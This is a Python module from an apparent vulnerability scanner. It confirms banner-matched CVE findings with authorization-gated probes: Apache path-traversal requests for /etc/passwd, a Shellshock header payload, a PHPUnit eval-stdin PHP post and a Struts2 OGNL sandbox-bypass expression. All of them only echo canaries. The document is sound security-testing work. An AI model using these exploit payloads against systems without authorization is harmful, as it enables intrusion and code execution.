"""
HEAVEN — Active Verification of Potential (version-banner) findings.

A network *version banner* does not prove exploitability. Distributions routinely
backport security fixes without bumping the advertised version, so an
unauthenticated banner-to-CVE match is only a *lead* — HEAVEN labels it
**Potential** (see ``heaven.utils.cvss.confirmation_status``). This module closes
the loop for a curated set of well-known CVEs by running a **safe, read-only,
non-destructive** behavioural probe. When the probe produces an unambiguous
observable, the finding is promoted **Potential → Confirmed**
(``validated=True`` + ``evidence.active_verification``). When no probe exists for
the CVE, or the probe is negative, the finding is **left exactly as it was**
(still Potential) — a verification result is never fabricated, and a negative
probe never deletes a real finding (the endpoint may simply be disabled).

Safety model
------------
* Every probe is a plain HTTP GET/POST that either reads a world-readable file
  (e.g. ``/etc/passwd`` via a path-traversal flaw) or reflects a unique canary
  the operator generated. No data is written, modified, or deleted on the target.
* Probes are **authorization-gated**: ``verify_findings`` / ``verify_finding``
  only send traffic when ``authorized=True`` (the orchestrator passes this only
  when the operator opted into active verification; the ``heaven verify`` CLI
  requires ``--i-have-authorization``). Without it the finding is returned
  untouched with a ``reason`` note.
* Probes are bounded (a handful of requests, short timeouts) so verification
  cannot blow up scan time.

Extending
---------
Add a new entry to ``_PROBES`` mapping a CVE id to an ``async`` probe that takes
``(session, base_url)`` and returns a :class:`VerifyResult` (or ``None`` when the
target shape does not apply). Keep every probe strictly read-only.
"""

from __future__ import annotations

import secrets
import time
from dataclasses import dataclass, field
from typing import Any, Awaitable, Callable, Optional
from urllib.parse import urlparse

try:
    import aiohttp
except ImportError:  # pragma: no cover - optional dependency
    aiohttp = None  # type: ignore[assignment]

from heaven.utils.cvss import is_confirmed_finding
from heaven.utils.logger import get_logger

logger = get_logger("vulnscan.active_verifier")


# ═══════════════════════════════════════════════════════════════════════════
# RESULT
# ═══════════════════════════════════════════════════════════════════════════


@dataclass
class VerifyResult:
    """Outcome of an active-verification probe for a single finding.

    ``probed``  — a probe was actually executed against the target.
    ``proved``  — the probe produced an unambiguous exploit observable.
    """

    cve: str
    probed: bool = False
    proved: bool = False
    technique: str = ""
    notes: str = ""
    evidence: dict[str, Any] = field(default_factory=dict)


# ═══════════════════════════════════════════════════════════════════════════
# TARGET SHAPING
# ═══════════════════════════════════════════════════════════════════════════


def _base_urls(finding: dict[str, Any]) -> list[str]:
    """Candidate ``scheme://host:port`` bases to probe for a finding.

    Findings from the CVE mapper carry ``host`` + ``port``; web findings may
    carry a full ``target`` URL. We try https on the well-known TLS ports and
    http otherwise, de-duplicated and order-preserving.
    """
    host = str(finding.get("host") or "").strip()
    port = finding.get("port")
    target = str(finding.get("target") or finding.get("url") or "").strip()

    bases: list[str] = []

    def _add(url: str) -> None:
        url = url.rstrip("/")
        if url and url not in bases:
            bases.append(url)

    if target.startswith(("http://", "https://")):
        p = urlparse(target)
        if p.scheme and p.netloc:
            _add(f"{p.scheme}://{p.netloc}")

    if host:
        try:
            port_i = int(port) if port not in (None, "", 0) else 0
        except (TypeError, ValueError):
            port_i = 0
        if port_i in (443, 8443):
            _add(f"https://{host}:{port_i}")
        elif port_i in (80, 8080, 8000, 8888):
            _add(f"http://{host}:{port_i}")
        elif port_i:
            # Unknown port — try both schemes, http first (most services).
            _add(f"http://{host}:{port_i}")
            _add(f"https://{host}:{port_i}")
        else:
            _add(f"http://{host}")
    return bases


async def _get(session: Any, url: str, *, headers: Optional[dict] = None,
               timeout: float = 8.0) -> tuple[int, str]:
    """Read-only GET returning ``(status, body)``; never raises."""
    try:
        async with session.get(
            url, headers=headers or {}, allow_redirects=False,
            timeout=aiohttp.ClientTimeout(total=timeout),
        ) as resp:
            body = await resp.text(errors="replace")
            return resp.status, body
    except Exception as exc:  # noqa: BLE001 — probe failure is not fatal
        logger.debug("verify GET failed for %s: %s", url, exc)
        return 0, ""


async def _post(session: Any, url: str, *, data: Any = None,
                headers: Optional[dict] = None, timeout: float = 8.0) -> tuple[int, str]:
    """POST returning ``(status, body)``; never raises. Used by probes whose
    benign observable (an arithmetic echo) comes back in the response body."""
    try:
        async with session.post(
            url, data=data, headers=headers or {}, allow_redirects=False,
            timeout=aiohttp.ClientTimeout(total=timeout),
        ) as resp:
            body = await resp.text(errors="replace")
            return resp.status, body
    except Exception as exc:  # noqa: BLE001 — probe failure is not fatal
        logger.debug("verify POST failed for %s: %s", url, exc)
        return 0, ""


# ═══════════════════════════════════════════════════════════════════════════
# PROBES  (each strictly read-only)
# ═══════════════════════════════════════════════════════════════════════════

# The unmistakable first line of a Unix passwd file — the canonical, harmless
# observable that a path-traversal / file-read flaw actually returned it.
_PASSWD_MARKER = "root:x:0:0:"  # nosec B105 # detection marker for /etc/passwd, not a secret


async def _probe_apache_traversal(session: Any, base: str) -> Optional[VerifyResult]:
    """CVE-2021-41773 / CVE-2021-42013 — Apache 2.4.49/2.4.50 path traversal.

    Sends the public path-traversal request for a world-readable file
    (``/etc/passwd``) and confirms only on the unambiguous ``root:x:0:0:``
    marker. This reads a world-readable file and writes nothing.
    """
    # The documented traversal vectors for the two CVEs. cgi-bin is the classic
    # alias; icons is present on a default install. Both are GETs.
    paths = [
        "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd",
        "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        # CVE-2021-42013 double-encoding bypass of the 41773 fix.
        "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd",
    ]
    for path in paths:
        status, body = await _get(session, base + path)
        if _PASSWD_MARKER in body:
            return VerifyResult(
                cve="", probed=True, proved=True, technique="path_traversal_file_read",
                notes="Read /etc/passwd via the Apache path-traversal flaw, confirmed.",
                evidence={
                    "request": f"GET {path}",
                    "observable": _PASSWD_MARKER,
                    "response_status": status,
                    "response_excerpt": body[:200],
                },
            )
    return VerifyResult(
        cve="", probed=True, proved=False, technique="path_traversal_file_read",
        notes="Traversal request did not return /etc/passwd (patched, cgi-bin "
              "disabled, or not this server), remains Potential.",
    )


async def _probe_shellshock(session: Any, base: str) -> Optional[VerifyResult]:
    """CVE-2014-6271 — Bash 'Shellshock' via a CGI environment variable.

    Injects a crafted ``() { :; };`` header whose trailing command echoes an
    ARITHMETIC-EXPANSION marker, and confirms only when the computed PRODUCT
    comes back in the body. The arithmetic is what makes this immune to a
    header-reflection false positive: a CGI (for example the classic
    ``test-cgi``) or an error page that merely echoes the raw User-Agent back
    shows the LITERAL ``$((a*b))``, whereas a genuinely vulnerable bash runs the
    echo and prints the product — so matching the product proves execution, not
    reflection. The payload only echoes; it neither writes nor deletes anything.
    (Same technique as ``exploit_engine.exploit_shellshock``.)
    """
    a, b = secrets.randbelow(9000) + 1000, secrets.randbelow(9000) + 1000
    rid = "HVN" + secrets.token_hex(5)
    marker = f"{rid}{a * b}"
    # Echo a CGI header + blank line first so a vulnerable Apache returns the
    # script output (not a 500 "malformed header from script"), then the
    # arithmetic marker whose PRODUCT only a real execution can print.
    payload = f"() {{ :; }}; echo Content-type: text/plain; echo; echo {rid}$(({a}*{b}))"
    # Common CGI endpoints a default/legacy install exposes.
    endpoints = ["/cgi-bin/status", "/cgi-bin/test.cgi", "/cgi-bin/test-cgi",
                 "/cgi-bin/", "/cgi-sys/defaultwebpage.cgi"]
    for ep in endpoints:
        status, body = await _get(
            session, base + ep,
            headers={"User-Agent": payload, "Referer": payload},
        )
        if marker in body:
            return VerifyResult(
                cve="", probed=True, proved=True, technique="shellshock_env_injection",
                notes="CGI executed an injected arithmetic echo (Shellshock): the "
                      "computed product, not the literal expression, came back, "
                      "confirmed.",
                evidence={
                    "endpoint": ep, "canary": marker, "response_status": status,
                    "response_excerpt": body[:200],
                },
            )
    return VerifyResult(
        cve="", probed=True, proved=False, technique="shellshock_env_injection",
        notes="No reachable CGI endpoint executed the injected marker (patched, "
              "reflection-only, or no CGI), remains Potential.",
    )


# The eval-stdin.php locations a PHPUnit install (bundled by a dependency) leaves
# web-reachable. Posting PHP to any of them runs it (CVE-2017-9841).
_PHPUNIT_PATHS = (
    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php",
    "/vendor/phpunit/src/Util/PHP/eval-stdin.php",
    "/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/vendor/phpunit/phpunit/src/Util/PHP/Template/eval-stdin.php",
)


async def _probe_phpunit_evalstdin(session: Any, base: str) -> Optional[VerifyResult]:
    """CVE-2017-9841 — PHPUnit ``eval-stdin.php`` evaluates the POST body as PHP.

    Posts a BENIGN script that echoes a unique marker concatenated with the
    PRODUCT of two random numbers. A genuinely vulnerable endpoint runs the echo
    and returns ``<rid><product>``; an endpoint that merely reflects the raw body
    shows the literal ``'<rid>'.(a*b)`` expression, whose digits never form the
    product, so matching the product proves execution, not reflection. The script
    only prints, it writes and deletes nothing. (Same arithmetic-oracle technique
    as the Shellshock probe.)
    """
    a, b = secrets.randbelow(9000) + 1000, secrets.randbelow(9000) + 1000
    rid = "HVN" + secrets.token_hex(5)
    marker = f"{rid}{a * b}"
    payload = f"<?php echo '{rid}'.({a}*{b});"
    for path in _PHPUNIT_PATHS:
        status, body = await _post(session, base + path, data=payload,
                                   headers={"Content-Type": "text/plain"})
        if marker in body:
            return VerifyResult(
                cve="", probed=True, proved=True, technique="php_eval_stdin",
                notes="PHPUnit eval-stdin.php executed an injected arithmetic echo: "
                      "the computed product, not the literal expression, came back, "
                      "confirmed.",
                evidence={"endpoint": path, "canary": marker,
                          "response_status": status, "response_excerpt": body[:200]},
            )
    return VerifyResult(
        cve="", probed=True, proved=False, technique="php_eval_stdin",
        notes="No reachable eval-stdin.php executed the injected marker (removed, "
              "blocked, or not this app), remains Potential.",
    )


async def _probe_struts2_ognl(session: Any, base: str) -> Optional[VerifyResult]:
    """CVE-2017-5638 — Struts2 Jakarta Multipart OGNL in the Content-Type header.

    Sends a SAFE OGNL expression that prints a unique marker plus an arithmetic
    PRODUCT to the HTTP response writer. It contains no ``Runtime``/``exec``/
    ``ProcessBuilder`` — it only writes to the response, so it neither runs an OS
    command nor changes anything on the target. A vulnerable Struts evaluates the
    OGNL and returns ``<rid><product>``; a server that merely echoes the raw
    Content-Type in an error page shows the literal ``print('<rid>')`` /
    ``print(a*b)`` text, whose digits never form the product, so a product match
    proves OGNL evaluation, not reflection.
    """
    a, b = secrets.randbelow(9000) + 1000, secrets.randbelow(9000) + 1000
    rid = "HVN" + secrets.token_hex(5)
    marker = f"{rid}{a * b}"
    ognl = (
        "%{(#nike='multipart/form-data')."
        "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        "(#_memberAccess?(#_memberAccess=#dm):"
        "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        "(#ognlUtil.getExcludedPackageNames().clear())."
        "(#ognlUtil.getExcludedClasses().clear())."
        "(#context.setMemberAccess(#dm))))."
        "(#w=@org.apache.struts2.ServletActionContext@getResponse().getWriter())."
        f"(#w.print('{rid}'))."
        f"(#w.print({a}*{b}))."
        "(#w.flush()).(#w.close())}"
    )
    endpoints = ["/", "/index.action", "/login.action", "/struts2-showcase/",
                 "/showcase.action"]
    for ep in endpoints:
        status, body = await _get(session, base + ep,
                                  headers={"Content-Type": ognl})
        if marker in body:
            return VerifyResult(
                cve="", probed=True, proved=True, technique="struts2_ognl_eval",
                notes="Struts2 evaluated an injected OGNL expression (printed the "
                      "computed product to the response), confirmed. The payload "
                      "only writes to the HTTP response, no command execution.",
                evidence={"endpoint": ep, "canary": marker,
                          "response_status": status, "response_excerpt": body[:200]},
            )
    return VerifyResult(
        cve="", probed=True, proved=False, technique="struts2_ognl_eval",
        notes="No endpoint evaluated the injected OGNL (patched, not Struts, or "
              "the Jakarta parser is disabled), remains Potential.",
    )


# CVE id → probe. Multiple CVEs can share one probe (same underlying flaw).
_PROBES: dict[str, Callable[[Any, str], Awaitable[Optional[VerifyResult]]]] = {
    "CVE-2021-41773": _probe_apache_traversal,
    "CVE-2021-42013": _probe_apache_traversal,
    "CVE-2014-6271": _probe_shellshock,
    "CVE-2014-6278": _probe_shellshock,
    "CVE-2017-9841": _probe_phpunit_evalstdin,
    "CVE-2017-5638": _probe_struts2_ognl,
}


def supported_cves() -> list[str]:
    """CVE ids with a safe active-verification probe (extensible via ``_PROBES``)."""
    return sorted(_PROBES)


def _finding_cve(finding: dict[str, Any]) -> str:
    ev = finding.get("evidence") if isinstance(finding.get("evidence"), dict) else {}
    return str(finding.get("cve") or finding.get("cve_id") or ev.get("cve") or "").strip().upper()


# ═══════════════════════════════════════════════════════════════════════════
# PUBLIC API
# ═══════════════════════════════════════════════════════════════════════════


def _record(finding: dict[str, Any], record: dict[str, Any]) -> None:
    """Attach the verification record to ``evidence.active_verification``."""
    ev = finding.get("evidence")
    if not isinstance(ev, dict):
        ev = {}
    ev["active_verification"] = record
    finding["evidence"] = ev


async def verify_finding(finding: dict[str, Any], *, session: Any = None,
                         authorized: bool = False, timeout: float = 8.0) -> dict[str, Any]:
    """Attempt to promote one Potential finding to Confirmed via a safe probe.

    Mutates and returns the finding. On proof: sets ``validated=True`` and
    ``confidence`` up to 0.99, and records the proof under
    ``evidence.active_verification``. Never raises; a negative or skipped probe
    leaves the finding's confirmation status unchanged.
    """
    cve = _finding_cve(finding)
    probe = _PROBES.get(cve)
    if probe is None:
        _record(finding, {"probed": False, "proved": False,
                          "reason": f"no safe active-verification probe for {cve or 'this finding'}"})
        return finding
    if is_confirmed_finding(finding):
        # Already proven by another signal — nothing to gain from re-probing.
        _record(finding, {"probed": False, "proved": False,
                          "reason": "already Confirmed by an earlier signal"})
        return finding
    if not authorized:
        _record(finding, {"probed": False, "proved": False,
                          "reason": "active verification not authorized (opt-in required)"})
        return finding
    if aiohttp is None:
        _record(finding, {"probed": False, "proved": False,
                          "reason": "aiohttp not installed, cannot run active probe"})
        return finding

    bases = _base_urls(finding)
    if not bases:
        _record(finding, {"probed": False, "proved": False,
                          "reason": "no reachable HTTP base URL for this finding"})
        return finding

    own_session = False
    if session is None:
        from heaven.recon.auth_session import aiohttp_session_kwargs
        session = aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(ssl=False, limit=20),
            **aiohttp_session_kwargs(),
        )
        own_session = True

    start = time.time()
    result: Optional[VerifyResult] = None
    try:
        for base in bases:
            result = await probe(session, base)
            if result is not None and result.proved:
                result.evidence["base_url"] = base
                break
    finally:
        if own_session:
            try:
                await session.close()
            except Exception:  # noqa: BLE001
                logger.debug("verify session close failed", exc_info=True)

    if result is None:
        _record(finding, {"probed": False, "proved": False, "cve": cve,
                          "reason": "probe not applicable to this target shape"})
        return finding

    record = {
        "probed": result.probed,
        "proved": result.proved,
        "cve": cve,
        "technique": result.technique,
        "notes": result.notes,
        "duration_ms": round((time.time() - start) * 1000),
        **({"proof": result.evidence} if result.evidence else {}),
    }
    _record(finding, record)

    if result.proved:
        # The probe IS ground truth — promote to Confirmed. Set the top-level
        # flag (in-memory pipeline) AND stamp the evidence so a finding that is
        # persisted and re-loaded from the store still reads Confirmed via
        # ``is_confirmed_finding`` (which inspects evidence.validation_result).
        finding["validated"] = True
        finding["proved"] = True
        finding["confidence"] = max(float(finding.get("confidence") or 0.0), 0.99)
        ev = finding.get("evidence")
        if isinstance(ev, dict):
            ev["validation_result"] = "confirmed"
    return finding


async def verify_findings(findings: Optional[list[dict[str, Any]]] = None, *,
                          authorized: bool = False, scan_id: str = "",
                          max_targets: int = 40, **_kw: Any) -> dict[str, Any]:
    """Batch active verification of Potential version-banner findings.

    Iterates findings that (a) are currently Potential and (b) have a CVE with a
    registered safe probe, promoting the ones a probe proves. Returns a summary
    plus the mutated findings under ``findings`` (identity-stable — the
    orchestrator's dedup collapses these onto the originals).
    """
    findings = findings or []
    # Only the ones worth probing: a registered CVE and still Potential.
    candidates = [
        f for f in findings
        if isinstance(f, dict)
        and _finding_cve(f) in _PROBES
        and not is_confirmed_finding(f)
    ]
    if not candidates:
        return {"skipped": True, "reason": "no Potential findings with a safe probe",
                "supported_cves": supported_cves(), "promoted": 0, "probed": 0,
                "findings": []}
    if not authorized:
        return {"skipped": True, "reason": "active verification not authorized (opt-in)",
                "candidates": len(candidates), "supported_cves": supported_cves(),
                "promoted": 0, "probed": 0, "findings": []}
    if aiohttp is None:
        return {"skipped": True, "reason": "aiohttp not installed",
                "promoted": 0, "probed": 0, "findings": []}

    logger.info("Active verification: %d Potential finding(s) with a safe probe",
                len(candidates))

    from heaven.recon.auth_session import aiohttp_session_kwargs
    promoted: list[dict] = []
    probed = 0
    async with aiohttp.ClientSession(
        connector=aiohttp.TCPConnector(ssl=False, limit=20),
        **aiohttp_session_kwargs(),
    ) as session:
        for f in candidates[:max_targets]:
            out = await verify_finding(f, session=session, authorized=True)
            rec = (out.get("evidence") or {}).get("active_verification") or {}
            if rec.get("probed"):
                probed += 1
            if rec.get("proved"):
                promoted.append(out)

    return {
        "scan_id": scan_id,
        "candidates": len(candidates),
        "probed": probed,
        "promoted": len(promoted),
        "supported_cves": supported_cves(),
        # Promoted findings are the SAME dict identities the pipeline already
        # holds (mutated in place); returned so dedup keeps the Confirmed copy.
        "findings": promoted,
    }
